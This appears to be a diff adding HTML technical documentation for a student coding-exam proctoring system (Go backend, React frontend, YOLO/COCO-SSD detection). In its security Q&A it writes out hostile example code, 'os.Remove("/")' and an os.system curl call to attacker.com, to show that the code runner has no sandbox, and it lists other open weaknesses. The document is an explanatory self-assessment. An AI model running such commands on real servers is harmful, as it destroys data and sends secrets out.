+<h1>16. DEPLOYMENT &amp; DEVOPS</h1>
+<h2>16.1 Architecture</h2>
+<table>
+<thead>
+<tr>
+<th>Component</th>
+<th>Hosting</th>
+<th>URL Pattern</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Frontend</td>
+<td><strong>Vercel</strong></td>
+<td><code>https://&lt;project&gt;.vercel.app</code></td>
+</tr>
+<tr>
+<td>backend-auth</td>
+<td><strong>Render.com</strong> (Go web service)</td>
+<td><code>https://system-monitoring-backend-new.onrender.com</code></td>
+</tr>
+<tr>
+<td>yolo-proctor</td>
+<td><strong>Render.com</strong> (Python web service)</td>
+<td><code>https://yolo-proctor.onrender.com</code></td>
+</tr>
+<tr>
+<td>Database</td>
+<td><strong>Supabase</strong> (PostgreSQL)</td>
+<td><code>aws-1-ap-south-1.pooler.supabase.com:5432</code></td>
+</tr>
+</tbody></table>
+<h2>16.2 Build Process</h2>
+<p><strong>Frontend</strong>: <code>cd frontend &amp;&amp; npm install &amp;&amp; npm run build</code> → outputs to <code>frontend/dist/</code><br><strong>Backend</strong>: <code>go build -o server .</code> → produces a single Go binary<br><strong>YOLO</strong>: <code>pip install -r requirements.txt</code> → then <code>uvicorn main:app --host 0.0.0.0 --port $PORT</code></p>
+<h2>16.3 Local Development</h2>
+<p><code>start-dev.bat</code> launches all 4 services in separate <code>cmd /k</code> windows:</p>
+<ol>
+<li><code>cd backend-auth &amp;&amp; go run main.go</code> (port 8080)</li>
+<li><code>cd Anticheating &amp;&amp; set PORT=8081 &amp;&amp; go run main.go</code> (port 8081)</li>
+<li><code>cd yolo-proctor &amp;&amp; python main.py</code> (port 8082)</li>
+<li><code>cd frontend &amp;&amp; npm run dev</code> (port 5173)</li>
+</ol>
+<hr>
+<h1>17. ERROR HANDLING</h1>
+<table>
+<thead>
+<tr>
+<th>Layer</th>
+<th>Strategy</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Frontend → Backend</strong></td>
+<td><code>try/catch</code> around <code>fetch()</code> calls; on error, falls back to localStorage simulation. Never crashes the UI.</td>
+</tr>
+<tr>
+<td><strong>Backend Controller</strong></td>
+<td><code>c.ShouldBindJSON()</code> returns validation errors as 400; service errors as 500; auth errors as 401/403</td>
+</tr>
+<tr>
+<td><strong>Backend Service</strong></td>
+<td>Returns <code>error</code> values; wraps errors with descriptive messages</td>
+</tr>
+<tr>
+<td><strong>Backend Repository</strong></td>
+<td>Returns raw GORM errors; callers check for <code>gorm.ErrRecordNotFound</code></td>
+</tr>
+<tr>
+<td><strong>Database</strong></td>
+<td>GORM&#39;s connection fallback chain (PostgreSQL → fallback DSN → SQLite)</td>
+</tr>
+<tr>
+<td><strong>AI Models</strong></td>
+<td>Try/catch around model loading; retry timer (5s); WebGL context loss handler</td>
+</tr>
+<tr>
+<td><strong>Email</strong></td>
+<td><code>defer recover()</code> prevents panics; errors logged but never propagated; DB insert is already complete</td>
+</tr>
+<tr>
+<td><strong>WebSocket</strong></td>
+<td><code>onerror</code> and <code>onclose</code> trigger 4-second reconnect timer</td>
+</tr>
+</tbody></table>
+<hr>
+<h1>18. COMPLETE END-TO-END USER FLOWS</h1>
+<h2>FLOW 1: Candidate Login</h2>
+<pre><code>User types email + password → clicks &quot;Sign In&quot;
+  → CandidateLogin.tsx: calls loginCandidate(email, password)
+  → AuthContext: calls api.auth.login(email, password)
+  → client.ts: POST http://localhost:8080/api/auth/login { email, password }
+  → Go Backend: AuthController.Login() → AuthService.AuthenticateUser()
+    → userRepo.FindByEmail() → SQL: SELECT * FROM users WHERE email = ?
+    → bcrypt.CompareHashAndPassword()
+    → generateToken() → JWT with HS256
+  → Response: 200 { success:true, data: { user: {...}, token: &quot;eyJ...&quot; } }
+  → client.ts: localStorage.setItem(&#39;codeshield_token&#39;, token)
+  → client.ts: localStorage.setItem(&#39;codeshield_auth_user&#39;, JSON.stringify(profile))
+  → AuthContext: setUser(profile) → re-render → navigate to /dashboard
+</code></pre>
+<h2>FLOW 7: AI Object Detection</h2>
+<pre><code>AICameraWidget mounted → webcam stream active → model loaded
+  → setInterval every 200ms:
+    → model.detect(videoElement) [COCO-SSD]
+    → Prediction: { class: &quot;cell phone&quot;, score: 0.72, bbox: [x,y,w,h] }
+    → Passes filter: &quot;phone&quot; in class AND score &gt;= 0.28 ✓
+    → setUnauthObject({ detected: true, object: &quot;cell phone&quot;, confidence: 0.72 })
+    → onInfractionChange callback fires
+    → reportViolation(&#39;UNAUTHORIZED OBJECT DETECTED!!!&#39;, &#39;Critical&#39;, -35)
+      → api.monitor.reportEvent()
+        → Local: events.unshift(newEvt), localStorage update
+        → Remote: POST /api/monitoring/malpractice { user_id: 5, event_type: &quot;UNAUTHORIZED_OBJECT&quot;, ... }
+          → MalpracticeService.LogViolation()
+            → INSERT INTO malpractice_logs
+            → go emailService.SendMalpracticeAlert()
+              → POST https://api.resend.com/emails → admin inbox
+      → confidenceScore: 94 → 59
+      → riskScore: 12 → 47
+      → Since severity is Critical → isLocked = true → EXAM LOCKED
+    → Canvas overlay: red bounding box + &quot;🚨 CELL PHONE 72%&quot; label
+    → Red fullscreen overlay: &quot;UNAUTHORIZED OBJECT DETECTED!!!&quot;
+</code></pre>
+<hr>
+<h1>19. FILE-BY-FILE TECHNICAL MAPPING</h1>
+<p><em>(Key files — see Section 1.3 and 1.4 for the complete list)</em></p>
+<h3><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/services/compiler_service.go">compiler_service.go</a></h3>
+<ul>
+<li><strong>Responsibility</strong>: Multi-language code compilation and execution</li>
+<li><strong>Key functions</strong>: <code>RunCode()</code>, <code>SubmitCode()</code>, <code>executeCode()</code>, <code>executeGoCode()</code>, <code>executePythonCode()</code>, <code>executeNodeCode()</code>, <code>executeJavaCode()</code>, <code>executeCppCode()</code>, <code>executeRustCode()</code></li>
+<li><strong>Inputs</strong>: Source code (string), language identifier, test cases from DB</li>
+<li><strong>Outputs</strong>: stdout, compilation error, runtime error</li>
+<li><strong>Security</strong>: <code>os/exec</code> with timeout context; no sandboxing</li>
+<li><strong>Performance</strong>: Each execution creates a temp directory, writes files, spawns a process</li>
+</ul>
+<h3><a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/frontend/src/components/monitoring/AICameraWidget.tsx">AICameraWidget.tsx</a></h3>
+<ul>
+<li><strong>Responsibility</strong>: 830-line AI camera component — the heart of the proctoring system</li>
+<li><strong>Inputs</strong>: <code>cameraActive</code> from MonitoringContext, <code>onInfractionChange</code> callback</li>
+<li><strong>Outputs</strong>: Sets <code>unauthObject</code> and <code>focusShift</code> state → triggers <code>reportViolation</code></li>
+<li><strong>Dependencies</strong>: TensorFlow.js, COCO-SSD, MediaPipe (CDN), WebSocket to YOLO</li>
+<li><strong>Performance</strong>: Three concurrent 200ms intervals (frame sending, object detection, face mesh)</li>
+</ul>
+<hr>
+<h1>20. DEPENDENCY ANALYSIS</h1>
+<h2>Frontend Dependencies</h2>
+<table>
+<thead>
+<tr>
+<th>Package</th>
+<th>Version</th>
+<th>Purpose</th>
+<th>Critical?</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>react</code> + <code>react-dom</code></td>
+<td>19.2.7</td>
+<td>UI rendering framework</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td><code>react-router-dom</code></td>
+<td>7.18.1</td>
+<td>Client-side routing</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td><code>@monaco-editor/react</code></td>
+<td>4.7.0</td>
+<td>VS Code-quality code editor</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td><code>@tensorflow/tfjs</code></td>
+<td>4.22.0</td>
+<td>ML inference runtime (browser)</td>
+<td>Yes (for AI proctoring)</td>
+</tr>
+<tr>
+<td><code>@tensorflow-models/coco-ssd</code></td>
+<td>2.2.3</td>
+<td>Object detection model</td>
+<td>Yes (for AI proctoring)</td>
+</tr>
+<tr>
+<td><code>axios</code></td>
+<td>1.18.1</td>
+<td>HTTP client</td>
+<td><strong>Unused</strong> — <code>fetch</code> is used instead</td>
+</tr>
+<tr>
+<td><code>framer-motion</code></td>
+<td>12.42.2</td>
+<td>Page transitions and animations</td>
+<td>No (cosmetic)</td>
+</tr>
+<tr>
+<td><code>lucide-react</code></td>
+<td>1.25.0</td>
+<td>SVG icon library</td>
+<td>No (cosmetic)</td>
+</tr>
+<tr>
+<td><code>recharts</code></td>
+<td>3.10.0</td>
+<td>Admin dashboard charts</td>
+<td>Partial</td>
+</tr>
+<tr>
+<td><code>tailwindcss</code></td>
+<td>4.3.3</td>
+<td>Utility-first CSS</td>
+<td>Yes (all styling)</td>
+</tr>
+<tr>
+<td><code>@vercel/analytics</code></td>
+<td>2.0.1</td>
+<td>Page view tracking</td>
+<td>No (optional)</td>
+</tr>
+</tbody></table>
+<h2>Backend Dependencies (Go)</h2>
+<table>
+<thead>
+<tr>
+<th>Package</th>
+<th>Version</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>gin-gonic/gin</code></td>
+<td>1.12.0</td>
+<td>HTTP web framework</td>
+</tr>
+<tr>
+<td><code>golang-jwt/jwt/v5</code></td>
+<td>5.3.1</td>
+<td>JWT creation and validation</td>
+</tr>
+<tr>
+<td><code>golang.org/x/crypto</code></td>
+<td>0.54.0</td>
+<td>bcrypt password hashing</td>
+</tr>
+<tr>
+<td><code>gorm.io/gorm</code></td>
+<td>1.31.2</td>
+<td>ORM for database operations</td>
+</tr>
+<tr>
+<td><code>gorm.io/driver/postgres</code></td>
+<td>1.6.0</td>
+<td>PostgreSQL GORM driver</td>
+</tr>
+<tr>
+<td><code>glebarez/sqlite</code></td>
+<td>1.11.0</td>
+<td>Pure-Go SQLite GORM driver (fallback)</td>
+</tr>
+</tbody></table>
+<h2>YOLO Dependencies (Python)</h2>
+<table>
+<thead>
+<tr>
+<th>Package</th>
+<th>Version</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>ultralytics</code></td>
+<td>≥8.0.0</td>
+<td>YOLOv8 inference engine</td>
+</tr>
+<tr>
+<td><code>opencv-python-headless</code></td>
+<td>≥4.8.0</td>
+<td>Image decoding (no GUI)</td>
+</tr>
+<tr>
+<td><code>fastapi</code></td>
+<td>≥0.100.0</td>
+<td>Async web framework</td>
+</tr>
+<tr>
+<td><code>uvicorn</code></td>
+<td>≥0.22.0</td>
+<td>ASGI server</td>
+</tr>
+<tr>
+<td><code>websockets</code></td>
+<td>≥11.0</td>
+<td>WebSocket support</td>
+</tr>
+<tr>
+<td><code>numpy</code></td>
+<td>≥1.24.0</td>
+<td>Array operations for image processing</td>
+</tr>
+</tbody></table>
+<hr>
+<h1>21. DATA FLOW &amp; DATA CONTRACTS</h1>
+<h2>Login Request/Response</h2>
+<p><strong>Request</strong>: <code>POST /api/auth/login</code></p>
+<pre><code class="language-json">{ &quot;email&quot;: &quot;kishore@shakthi.edu&quot;, &quot;password&quot;: &quot;password123&quot; }
+</code></pre>
+<p><strong>Response</strong>: <code>200 OK</code></p>
+<pre><code class="language-json">{
+  &quot;success&quot;: true,
+  &quot;message&quot;: &quot;login successful&quot;,
+  &quot;data&quot;: {
+    &quot;user&quot;: {
+      &quot;id&quot;: 5,
+      &quot;username&quot;: &quot;kishore_shakthi&quot;,
+      &quot;email&quot;: &quot;kishore@shakthi.edu&quot;,
+      &quot;name&quot;: &quot;Kishore S&quot;,
+      &quot;role&quot;: &quot;user&quot;,
+      &quot;phone&quot;: &quot;&quot;,
+      &quot;college&quot;: &quot;Sri Shakthi Institute of Engineering and Technology&quot;,
+      &quot;department&quot;: &quot;&quot;,
+      &quot;reg_no&quot;: &quot;&quot;,
+      &quot;created_at&quot;: &quot;2026-09-01T10:00:00Z&quot;
+    },
+    &quot;token&quot;: &quot;eyJhbGciOiJIUzI1NiIs...&quot;
+  }
+}
+</code></pre>
+<h2>Malpractice Log Request</h2>
+<p><strong>Request</strong>: <code>POST /api/monitoring/malpractice</code></p>
+<pre><code class="language-json">{
+  &quot;user_id&quot;: 5,
+  &quot;candidate_name&quot;: &quot;Kishore S&quot;,
+  &quot;candidate_email&quot;: &quot;kishore@shakthi.edu&quot;,
+  &quot;event_type&quot;: &quot;UNAUTHORIZED_OBJECT&quot;,
+  &quot;details&quot;: &quot;Real-time AI detected forbidden device: CELL PHONE (72% confidence).&quot;,
+  &quot;severity&quot;: &quot;CRITICAL&quot;,
+  &quot;detected_item&quot;: &quot;cell phone&quot;,
+  &quot;confidence&quot;: 0.72
+}
+</code></pre>
+<hr>
+<h1>22. TECHNICAL DECISION ANALYSIS</h1>
+<table>
+<thead>
+<tr>
+<th>Decision</th>
+<th>Why This?</th>
+<th>Trade-offs</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>React</strong></td>
+<td>Industry standard, large ecosystem, component model fits complex UIs</td>
+<td>Large bundle size; virtual DOM overhead</td>
+</tr>
+<tr>
+<td><strong>TypeScript</strong></td>
+<td>Type safety reduces bugs, better IDE support</td>
+<td>Build step required; learning curve</td>
+</tr>
+<tr>
+<td><strong>Vite</strong></td>
+<td>Fast HMR, native ES modules, simpler than Webpack</td>
+<td>Less ecosystem than Webpack; newer</td>
+</tr>
+<tr>
+<td><strong>TailwindCSS</strong></td>
+<td>Rapid prototyping, no CSS file management</td>
+<td>HTML readability suffers; large class lists</td>
+</tr>
+<tr>
+<td><strong>Go (Gin)</strong></td>
+<td>High performance, strong typing, built-in concurrency, single binary</td>
+<td>Verbose error handling; smaller ecosystem than Node.js</td>
+</tr>
+<tr>
+<td><strong>GORM</strong></td>
+<td>Most popular Go ORM, AutoMigrate, associations</td>
+<td>Performance overhead vs raw SQL; N+1 risk</td>
+</tr>
+<tr>
+<td><strong>PostgreSQL (Supabase)</strong></td>
+<td>Managed, free tier, reliable, familiar SQL</td>
+<td>Vendor lock-in on connection pooler; latency from India</td>
+</tr>
+<tr>
+<td><strong>JWT</strong></td>
+<td>Stateless auth, no server-side session store needed</td>
+<td>Cannot revoke individual tokens; vulnerable in localStorage</td>
+</tr>
+<tr>
+<td><strong>Monaco Editor</strong></td>
+<td>Full IDE experience (syntax highlighting, IntelliSense)</td>
+<td>Heavy (~5MB); complex integration</td>
+</tr>
+<tr>
+<td><strong>YOLOv8</strong></td>
+<td>State-of-art real-time object detection; Nano variant is lightweight</td>
+<td>Requires Python server; 6.5MB model file</td>
+</tr>
+<tr>
+<td><strong>COCO-SSD</strong></td>
+<td>Runs entirely in browser via TensorFlow.js; zero server dependency</td>
+<td>Less accurate than YOLOv8; browser CPU/GPU intensive</td>
+</tr>
+<tr>
+<td><strong>MediaPipe FaceMesh</strong></td>
+<td>Accurate facial landmark detection; real-time in browser</td>
+<td>CDN dependency; may fail if CDN is blocked</td>
+</tr>
+<tr>
+<td><strong>WebSocket</strong></td>
+<td>Efficient for continuous frame streaming (5 fps × ~50KB each)</td>
+<td>Requires persistent connection; harder to load balance</td>
+</tr>
+<tr>
+<td><strong>Resend</strong></td>
+<td>Simple email API, generous free tier, no SMTP setup</td>
+<td>Third-party dependency; rate limits on free tier</td>
+</tr>
+</tbody></table>
+<hr>
+<h1>23. IMPLEMENTED vs PROPOSED</h1>
+<h2>A. FULLY IMPLEMENTED ✅</h2>
+<ul>
+<li>JWT-based authentication (candidate + admin)</li>
+<li>bcrypt password hashing</li>
+<li>Multi-language code execution (Go, Python, JS, TS, Java, C++, Rust)</li>
+<li>In-browser COCO-SSD object detection</li>
+<li>MediaPipe FaceMesh focus shift detection</li>
+<li>YOLOv8 WebSocket server-side detection</li>
+<li>Malpractice logging to PostgreSQL/Supabase</li>
+<li>Email alerts via Resend API</li>
+<li>18+ anti-cheating browser event listeners</li>
+<li>Copy/paste/drag prevention</li>
+<li>Fullscreen enforcement with Escape key interception</li>
+<li>Keyboard Lock API usage</li>
+<li>Central exam timer (admin-controlled: start/pause/resume/extend/end)</li>
+<li>Exam password gate</li>
+<li>Monaco code editor with 11 language options</li>
+<li>Problem CRUD (admin creates; candidates view)</li>
+<li>Leaderboard with scoring</li>
+<li>Offline fallback mode (localStorage simulation)</li>
+<li>Triple database fallback (Supabase → local PostgreSQL → SQLite)</li>
+<li>Render.com + Vercel deployment configs</li>
+<li>Admin dashboard with live candidate monitoring</li>
+</ul>
+<h2>B. PARTIALLY IMPLEMENTED ⚠️</h2>
+<ul>
+<li><strong>Anticheating microservice</strong>: The Go code exists and starts, but the frontend&#39;s communication with it is best-effort (errors silently caught)</li>
+<li><strong>2FA for admin login</strong>: The <code>loginAdmin</code> function accepts a <code>code2FA</code> parameter but it is never validated</li>
+<li><strong>Voice detection</strong>: <code>voiceDetected</code> state exists in MonitoringContext but is never set to <code>true</code></li>
+<li><strong>Webcam-based evidence snapshots</strong>: <code>evidenceSnapshot: &#39;webcam-placeholder&#39;</code> is hardcoded</li>
+</ul>
+<h2>C. NOT IMPLEMENTED ❌</h2>
+<ul>
+<li><strong>Sandboxed code execution</strong> (Docker containers, gVisor, etc.)</li>
+<li><strong>Rate limiting</strong> on any endpoint</li>
+<li><strong>CSRF protection</strong></li>
+<li><strong>Token revocation / blacklisting</strong></li>
+<li><strong>WebSocket authentication</strong></li>
+<li><strong>Admin registration protection</strong> (anyone can register as admin)</li>
+<li><strong>File upload security</strong> (no file upload exists)</li>
+<li><strong>Automated testing</strong> (only one test file: <code>database_test.go</code>)</li>
+<li><strong>CI/CD pipeline</strong></li>
+<li><strong>Multiple face detection</strong> (model config is <code>maxNumFaces: 1</code>)</li>
+<li><strong>Screen recording / screenshot capture</strong></li>
+</ul>
+<hr>
+<h1>24. TECHNICAL LIMITATIONS</h1>
+<table>
+<thead>
+<tr>
+<th>Limitation</th>
+<th>Why It Happens</th>
+<th>Impact</th>
+<th>Mitigation</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>AI false positives</td>
+<td>COCO-SSD may classify a coffee cup as a &quot;cell phone&quot;</td>
+<td>Innocent candidates penalized (-35 score)</td>
+<td>Raise confidence threshold; require multi-frame confirmation</td>
+</tr>
+<tr>
+<td>AI false negatives</td>
+<td>Object partially occluded or at angle</td>
+<td>Cheating goes undetected</td>
+<td>Dual detection (COCO-SSD + YOLOv8) reduces this</td>
+</tr>
+<tr>
+<td>Browser DevTools bypass</td>
+<td>F12 interception only prevents default behavior; user can open DevTools via browser menu → More Tools</td>
+<td>Exam content visible in DevTools</td>
+<td>Cannot fully prevent; log the attempt</td>
+</tr>
+<tr>
+<td>Virtual machine evasion</td>
+<td>Candidate runs exam in a VM with another browser alongside</td>
+<td>All browser-based detection bypassed</td>
+<td>IP fingerprinting; screen recording</td>
+</tr>
+<tr>
+<td>Render.com cold starts</td>
+<td>Free tier spins down after inactivity</td>
+<td>First API call takes 30-60 seconds; 3.5s timeout triggers offline fallback</td>
+<td>Upgrade to paid tier or use keepalive pings</td>
+</tr>
+<tr>
+<td>Code execution security</td>
+<td>No sandbox</td>
+<td>Server compromise possible</td>
+<td>Docker/gVisor containers</td>
+</tr>
+</tbody></table>
+<hr>
+<h1>25. SCALABILITY</h1>
+<table>
+<thead>
+<tr>
+<th>Scale</th>
+<th>Backend</th>
+<th>WebSockets</th>
+<th>AI Inference</th>
+<th>Database</th>
+<th>Code Exec</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>10 candidates</strong></td>
+<td>✅ Single Go process handles easily</td>
+<td>✅ 10 concurrent WS connections fine</td>
+<td>✅ Each browser runs own COCO-SSD</td>
+<td>✅ Light load</td>
+<td>⚠️ 10 concurrent compilations possible</td>
+</tr>
+<tr>
+<td><strong>100 candidates</strong></td>
+<td>✅ Go handles 100 req/s easily</td>
+<td>⚠️ 100 WS + 500 frames/sec to single Python process</td>
+<td>✅ Client-side, no server impact</td>
+<td>⚠️ 150 queries/sec (timer polling)</td>
+<td>⚠️ 100 concurrent <code>os/exec</code> processes</td>
+</tr>
+<tr>
+<td><strong>1,000 candidates</strong></td>
+<td>⚠️ Needs horizontal scaling</td>
+<td>❌ Single Python process cannot handle 5,000 frames/sec</td>
+<td>✅ Client-side</td>
+<td>❌ 667 queries/sec timer polling</td>
+<td>❌ 1,000 processes = OOM</td>
+</tr>
+<tr>
+<td><strong>10,000 candidates</strong></td>
+<td>❌ Needs load balancer, multiple instances</td>
+<td>❌ Need multiple YOLO servers behind LB</td>
+<td>✅ Client-side</td>
+<td>❌ Supabase connection limits exceeded</td>
+<td>❌ Not feasible</td>
+</tr>
+</tbody></table>
+<p><strong>Key bottlenecks</strong>: </p>
+<ol>
+<li>Timer polling at 1.5s intervals: 10,000 candidates = 6,667 GET requests/second just for timer</li>
+<li>YOLO server: single-threaded Python process; each frame takes ~50ms inference = max 20 frames/sec total</li>
+<li>Code execution: each compilation spawns an OS process consuming ~50-200MB; no queue</li>
+</ol>
+<hr>
+<h1>26. TECHNICAL JURY / INTERVIEW QUESTIONS</h1>
+<h2>Beginner Questions</h2>
+<p><strong>Q: What is the role of JWT in this project?</strong><br>A: JWT (JSON Web Token) is used for stateless authentication. When a user logs in, the Go backend generates a token signed with HMAC-SHA256 containing the user&#39;s ID, email, and role. This token is stored in localStorage and sent as a <code>Bearer</code> token in the <code>Authorization</code> header of subsequent API requests. The middleware extracts and validates this token on each request, eliminating the need for server-side session storage.<br><em>Proof</em>: <a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/services/auth_service.go#L186-L200">auth_service.go:186-200</a></p>
+<p><strong>Q: How does the system store passwords?</strong><br>A: Passwords are hashed using bcrypt with a cost factor of 10 (the Go <code>bcrypt.DefaultCost</code>). The raw password is never stored. During login, <code>bcrypt.CompareHashAndPassword()</code> compares the stored hash with the provided password.<br><em>Proof</em>: <a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/backend-auth/internal/services/auth_service.go#L50">auth_service.go:50</a></p>
+<h2>Advanced Questions</h2>
+<p><strong>Q: Why do you have both COCO-SSD and YOLOv8 for the same detection task?</strong><br>A: Redundancy and resilience. COCO-SSD runs in the browser via TensorFlow.js — it works even when the YOLO server is offline (Render.com cold start). YOLOv8 is more accurate and runs on the server. If either system detects a forbidden object, the alert fires. They operate on different confidence thresholds (COCO: 0.28 for phones; YOLO: 0.30).<br><em>Proof</em>: <a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/frontend/src/components/monitoring/AICameraWidget.tsx#L400-L473">AICameraWidget.tsx:400-473</a> and <a href="file:///c:/Users/Hp/OneDrive/Documents/GitHub/System-monitoring-/yolo-proctor/main.py#L56-L86">main.py:56-86</a></p>
+<p><strong>Q: What happens if the database is completely unreachable?</strong><br>A: The backend has a triple fallback: Supabase PostgreSQL → local PostgreSQL → SQLite. If even SQLite fails, <code>log.Fatalf</code> terminates the server. The frontend has its own fallback: if the backend API is unreachable (3.5s timeout), it switches to localStorage-based simulation, allowing the UI to function in demo mode.</p>
+<h2>Security Questions</h2>
+<p><strong>Q: Can a candidate bypass the fullscreen enforcement?</strong><br>A: Partially. The code intercepts Escape key in the capture phase and uses <code>navigator.keyboard.lock()</code> to prevent the Chromium 2-second hold-to-exit mechanism. However, Alt+F4 closes the browser entirely. On some OS/browser combinations, the keyboard lock API is not supported. The system <strong>logs</strong> the fullscreen exit as a High severity violation (-15 points) regardless.</p>
+<p><strong>Q: Is the code execution secure for production?</strong><br>A: No. Code runs directly on the server via <code>os/exec</code> without sandboxing. A malicious candidate could execute <code>os.Remove(&quot;/&quot;)</code> in Go, <code>import os; os.system(&quot;curl attacker.com&quot;)</code> in Python, etc. For production, each execution should run in an isolated Docker container with network disabled, filesystem restrictions, and cgroup resource limits.</p>
+<hr>
+<h1>27. &quot;WHY DID YOU BUILD IT THIS WAY?&quot; QUESTIONS</h1>
+<p><strong>Q: Why Go for the backend instead of Node.js?</strong><br>A: Go offers superior concurrency handling through goroutines (used for async email sending), compiles to a single binary (simplifies deployment), has strong typing (catches errors at compile time), and the Gin framework provides fast HTTP routing. Node.js would work but Go&#39;s <code>os/exec</code> process management and goroutine-based parallelism make it better suited for a code execution engine.</p>
+<p><strong>Q: Why Supabase instead of MongoDB or Firebase?</strong><br>A: The data model is relational — users have exam sessions, sessions have submissions, problems have test cases. PostgreSQL&#39;s ACID transactions, foreign keys, and JOIN capabilities are essential (e.g., the leaderboard JOINs users with scores). Supabase provides a managed PostgreSQL instance with a generous free tier, connection pooling, and no configuration overhead.</p>
+<p><strong>Q: What happens if the webcam is disabled?</strong><br>A: The camera request is wrapped in a try/catch. If <code>getUserMedia</code> fails, <code>cameraActive</code> remains <code>true</code> but no stream is attached. COCO-SSD and MediaPipe cannot process frames, so AI detections stop. The YOLO WebSocket receives no frames. <strong>This is a limitation</strong> — the system should flag when the camera is unavailable.</p>
+<p><strong>Q: Can your code execution server be attacked?</strong><br>A: Yes. The current implementation runs user code directly on the server with the same permissions as the Go process. Mitigations include: 5-second timeout (prevents infinite loops), code size limit (100KB), and temp directory cleanup. But a skilled attacker could read environment variables (including DB passwords), execute network requests, or modify the filesystem.</p>
+<p><strong>Q: What would you change for production?</strong><br>A: (1) Containerized code execution (Docker per submission); (2) Restrict CORS to specific domains; (3) Add rate limiting; (4) Move JWT to httpOnly cookies; (5) Protect admin registration; (6) Add WebSocket authentication; (7) Implement token revocation; (8) Remove credentials from render.yaml; (9) Add CI/CD with automated tests; (10) Replace timer polling with WebSocket.</p>
+<hr>
+<h1>28. COMPLETE TERMINOLOGY GLOSSARY</h1>
+<table>
+<thead>
+<tr>
+<th>Term</th>
+<th>Simple Definition</th>
+<th>How Used In This Project</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>REST</strong></td>
+<td>Architectural style for APIs using HTTP methods</td>
+<td>All backend APIs follow REST (GET/POST/PUT/DELETE)</td>
+</tr>
+<tr>
+<td><strong>JWT</strong></td>
+<td>Encoded JSON token for stateless auth</td>
+<td>Bearer tokens in Authorization header; HS256 signed</td>
+</tr>
+<tr>
+<td><strong>bcrypt</strong></td>
+<td>Adaptive password hashing algorithm</td>
+<td>Passwords hashed with cost 10 before DB storage</td>
+</tr>
+<tr>
+<td><strong>GORM</strong></td>
+<td>Go Object-Relational Mapping library</td>
+<td>All DB operations use GORM; auto-migration creates tables</td>
+</tr>
+<tr>
+<td><strong>Gin</strong></td>
+<td>High-performance Go web framework</td>
+<td>HTTP router, middleware chain, JSON binding</td>
+</tr>
+<tr>
+<td><strong>CORS</strong></td>
+<td>Cross-Origin Resource Sharing</td>
+<td>Middleware sets <code>Allow-Origin: *</code> for all origins</td>
+</tr>
+<tr>
+<td><strong>WebSocket</strong></td>
+<td>Full-duplex persistent TCP connection</td>
+<td>YOLOv8 frame streaming between browser and Python server</td>
+</tr>
+<tr>
+<td><strong>COCO-SSD</strong></td>
+<td>Pre-trained object detection model (COCO dataset)</td>
+<td>Browser-side TF.js model detecting phones/forbidden objects</td>
+</tr>
+<tr>
+<td><strong>YOLOv8</strong></td>
+<td>You Only Look Once v8 — real-time object detection</td>
+<td>Server-side Python model for high-accuracy detection</td>
+</tr>
+<tr>
+<td><strong>MediaPipe</strong></td>
+<td>Google&#39;s ML framework for face/body analysis</td>
+<td>FaceMesh: 468 landmarks → gaze direction estimation</td>
+</tr>
+<tr>
+<td><strong>TensorFlow.js</strong></td>
+<td>ML inference library for JavaScript</td>
+<td>Runs COCO-SSD model in the browser GPU/CPU</td>
+</tr>
+<tr>
+<td><strong>Monaco Editor</strong></td>
+<td>VS Code&#39;s core editor component</td>
+<td>Code editing with syntax highlighting, IntelliSense</td>
+</tr>
+<tr>
+<td><strong>Supabase</strong></td>
+<td>Open-source Firebase alternative</td>
+<td>Used only as managed PostgreSQL hosting</td>
+</tr>
+<tr>
+<td><strong>Resend</strong></td>
+<td>Email delivery API service</td>
+<td>Sends malpractice alert emails to admins</td>
+</tr>
+<tr>
+<td><strong>Render.com</strong></td>
+<td>Cloud hosting platform</td>
+<td>Hosts Go backend and Python YOLO server</td>
+</tr>
+<tr>
+<td><strong>Vercel</strong></td>
+<td>Frontend hosting with CDN</td>
+<td>Hosts the React SPA with automatic deployments</td>
+</tr>
+<tr>
+<td><strong>os/exec</strong></td>
+<td>Go stdlib package for process execution</td>
+<td>Runs compiled code in a subprocess with timeout</td>
+</tr>
+<tr>
+<td><strong>AutoMigrate</strong></td>
+<td>GORM feature to sync models with DB schema</td>
+<td>Creates/updates tables without dropping data on startup</td>
+</tr>
+<tr>
+<td><strong>Goroutine</strong></td>
+<td>Lightweight Go concurrent function</td>
+<td>Email sending runs in a goroutine (<code>go emailService.Send...</code>)</td>
+</tr>
+<tr>
+<td><strong>Bounding Box</strong></td>
+<td>Rectangle coordinates around a detected object</td>
+<td>COCO-SSD/YOLO output; rendered on canvas overlay</td>
+</tr>
+<tr>
+<td><strong>Confidence Score</strong> (AI)</td>
+<td>Probability that a detection is correct (0.0–1.0)</td>
+<td>Filtered against thresholds (0.28–0.35)</td>
+</tr>
+<tr>
+<td><strong>Confidence Score</strong> (Monitoring)</td>
+<td>Candidate&#39;s trust score (0–100)</td>
+<td>Starts at 94; decremented by violations</td>
+</tr>
+<tr>
+<td><strong>Singleton Pattern</strong></td>
+<td>Design pattern with only one instance</td>
+<td>ExamTimer table always has ID=1</td>
+</tr>
+</tbody></table>
+<hr>
+<h1>29. FINAL ARCHITECTURE DIAGRAM</h1>
+<pre><code>┌─────────────────────────────────────────────────────────────────┐
+│                        CANDIDATE BROWSER                         │
+│                                                                  │
+│  ┌──────────────┐  ┌──────────────┐  ┌───────────────────────┐  │
+│  │ React SPA    │  │ Monaco       │  │ AI Vision Engine      │  │
+│  │ (Vite+TS)    │  │ Code Editor  │  │  ├─ COCO-SSD (TF.js)  │  │
